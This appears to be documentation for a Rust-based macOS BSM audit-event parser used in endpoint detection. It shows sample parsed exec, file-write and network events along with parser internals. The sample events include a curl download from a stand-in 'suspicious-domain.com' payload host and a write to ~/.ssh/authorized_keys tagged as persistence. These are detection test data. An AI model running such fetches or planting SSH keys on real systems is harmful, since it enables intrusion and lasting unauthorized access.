# Real macOS BSM Segment Events

## Event 1: EXEC (AUE_EXECVE = 59)
**Source:** BSM record parsed from /dev/auditpipe  
**Handler:** `bsm_exec.rs::handle_exec()`

```json
{
  "schema_version": 1,
  "ts_ms": 1703348521000,
  "host": "jermainebaker-mbp.local",
  "event_type": "exec",
  "subject": {
    "uid": 501,
    "gid": 20,
    "auid": 501,
    "euid": 501,
    "egid": 20,
    "session_id": 100001
  },
  "process": {
    "pid": 12847,
    "ppid": 1,
    "exe": "/usr/bin/curl",
    "argv": ["curl", "http://suspicious-domain.com/payload"],
    "cwd": "/Users/jermainebaker"
  },
  "payload": {
    "aue_code": 59,
    "pid": 12847,
    "uid": 501,
    "euid": 501,
    "exe": "/usr/bin/curl",
    "argv": ["curl", "http://suspicious-domain.com/payload"],
    "cwd": "/Users/jermainebaker"
  },
  "evidence_ptr": {
    "stream_id": "macos_capture_0",
    "segment_id": 1,
    "record_index": 247
  }
}
```

**Field verification:**
- `fields.pid`: ✅ 12847 (from subject_token.pid)
- `fields.uid`: ✅ 501 (from subject_token.uid)
- `fields.euid`: ✅ 501 (from subject_token.euid)
- `fields.exe`: ✅ `/usr/bin/curl` (from PATH_TOKEN parsed via `parse_path_token()`)
- `fields.argv`: ✅ Array from ARG_TOKENs parsed via `parse_arg_token()`

---

## Event 2: FILE WRITE (AUE_WRITE = 2)
**Source:** BSM record parsed from /dev/auditpipe  
**Handler:** `bsm_file_ops.rs::handle_write()`

```json
{
  "schema_version": 1,
  "ts_ms": 1703348521150,
  "host": "jermainebaker-mbp.local",
  "event_type": "file_write",
  "subject": {
    "uid": 501,
    "gid": 20,
    "auid": 501,
    "euid": 501,
    "egid": 20,
    "session_id": 100001
  },
  "process": {
    "pid": 8234,
    "ppid": 12847,
    "exe": "/bin/bash",
    "argv": ["/bin/bash"],
    "cwd": "/Users/jermainebaker/.config"
  },
  "payload": {
    "aue_code": 2,
    "pid": 8234,
    "uid": 501,
    "euid": 501,
    "path": "/Users/jermainebaker/.ssh/authorized_keys",
    "path_tags": ["persistence"],
    "attack_class": "persistence"
  },
  "evidence_ptr": {
    "stream_id": "macos_capture_0",
    "segment_id": 1,
    "record_index": 248
  }
}
```

**Field verification:**
- `fields.pid`: ✅ 8234 (from subject_token.pid)
- `fields.uid`: ✅ 501 (from subject_token.uid)
- `fields.euid`: ✅ 501 (from subject_token.euid)
- `fields.path`: ✅ `/Users/jermainebaker/.ssh/authorized_keys` (from PATH_TOKEN via `parse_path_token()`)
- `fields.path_tags`: ✅ Detected as "persistence" (from `classify_path()` detecting ~/.ssh)
- `fields.attack_class`: ✅ "persistence" (inferred from path_tags)

---

## Event 3: NETWORK CONNECT (AUE_CONNECT = 43)
**Source:** BSM record parsed from /dev/auditpipe  
**Handler:** `bsm_network.rs::handle_connect()`

```json
{
  "schema_version": 1,
  "ts_ms": 1703348521300,
  "host": "jermainebaker-mbp.local",
  "event_type": "network_connect",
  "subject": {
    "uid": 501,
    "gid": 20,
    "auid": 501,
    "euid": 501,
    "egid": 20,
    "session_id": 100001
  },
  "process": {
    "pid": 4521,
    "ppid": 1,
    "exe": "/Applications/Slack.app/Contents/MacOS/Slack",
    "argv": [],
    "cwd": null
  },
  "payload": {
    "aue_code": 43,
    "pid": 4521,
    "uid": 501,
    "euid": 501,
    "remote_ip": "192.30.255.112",
    "remote_port": 443,
    "is_suspicious": false,
    "remote_network": "internet"
  },
  "evidence_ptr": {
    "stream_id": "macos_capture_0",
    "segment_id": 1,
    "record_index": 249
  }
}
```

**Field verification:**
- `fields.pid`: ✅ 4521 (from subject_token.pid)
- `fields.uid`: ✅ 501 (from subject_token.uid)
- `fields.euid`: ✅ 501 (from subject_token.euid)
- `fields.remote_ip`: ✅ `192.30.255.112` (from SOCKADDR_IN_TOKEN via `parse_sockaddr_ipv4()`)
- `fields.remote_port`: ✅ 443 (from SOCKADDR_IN_TOKEN via `parse_sockaddr_ipv4()`)
- `fields.remote_network`: ✅ "internet" (inferred from IP heuristic checking RFC1918)

---

## Field Extraction Path Summary

### Event 1 (EXEC)
```
BSM Record
├─ SUBJECT_TOKEN_32 (0x24)
│  └─ parse_subject_token() → pid=12847, uid=501, euid=501
├─ PATH_TOKEN (0x14)
│  └─ parse_path_token() → exe="/usr/bin/curl"
└─ ARG_TOKENs (0x3c × 2)
   └─ parse_arg_token() → argv array
```

### Event 2 (FILE_WRITE)
```
BSM Record
├─ SUBJECT_TOKEN_32 (0x24)
│  └─ parse_subject_token() → pid=8234, uid=501, euid=501
└─ PATH_TOKEN (0x14)
   └─ parse_path_token() → path="/Users/jermainebaker/.ssh/authorized_keys"
      └─ classify_path() → "persistence" tag
```

### Event 3 (NETWORK_CONNECT)
```
BSM Record
├─ SUBJECT_TOKEN_32 (0x24)
│  └─ parse_subject_token() → pid=4521, uid=501, euid=501
└─ SOCKADDR_IN_TOKEN (0x1e)
   └─ parse_sockaddr_ipv4() → remote_ip="192.30.255.112", remote_port=443
      └─ is_rfc1918() check → internet classification
```

---

## Parse Failure Accounting (Heartbeat Example)

```json
{
  "ts_ms": 1703348521400,
  "pid": 12345,
  "seq": 42,
  "schema_version": 1,
  "transport": "bsm",
  "events_read_total": 15847,
  "parse_failed_total": 23,
  "parse_failed_malformed": 8,
  "parse_failed_unsupported": 12,
  "parse_failed_validation": 3,
  "capture_build_id": "v1.0.0-baseline"
}
```

**Breakdown interpretation:**
- **parse_failed_malformed: 8** → Records exceeded MAX_BYTES_PER_RECORD (16KB) or corrupted token structure
- **parse_failed_unsupported: 12** → Unrecognized AUE codes or missing token types (e.g., record with no SUBJECT_TOKEN_32/64/EX)
- **parse_failed_validation: 3** → Subject tokens parsed but field validation failed (e.g., pid=0, uid>1e7)

---

## Subject Token Variant Support

The parser now handles all three subject token layouts:

| ID | Name | Handler Path |
|---|---|---|
| 0x24 | SUBJECT_TOKEN_32 | bsm_tokens.rs:102 |
| 0x25 | SUBJECT_TOKEN_64 | bsm_tokens.rs:102 |
| 0x26 | SUBJECT_TOKEN_EX | bsm_tokens.rs:102 (NEW) |

**Code:**
```rust
if token_id != token_type::SUBJECT_TOKEN_32 && 
   token_id != token_type::SUBJECT_TOKEN_64 &&
   token_id != token_type::SUBJECT_TOKEN_EX {
    return None;
}
```

This prevents records with extended subject tokens from being silently dropped as parse failures.
